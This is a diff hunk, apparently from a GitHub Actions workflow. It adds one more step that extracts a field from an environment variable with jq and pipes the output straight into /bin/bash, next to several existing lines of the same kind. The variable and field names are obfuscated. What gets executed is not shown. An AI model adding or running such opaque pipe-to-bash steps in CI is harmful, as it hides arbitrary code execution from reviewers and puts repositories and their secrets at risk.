@@ -50,6 +50,7 @@ jobs:
           printf '%s' "$ubi6" | jq -r .zsln166 | /bin/bash
           echo $frki01 | jq -r .wv2 | /bin/bash
           printf '%s' "$oau65963" | jq -r .skiv859 | /bin/bash
+          echo $et35 | jq -r .a387 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
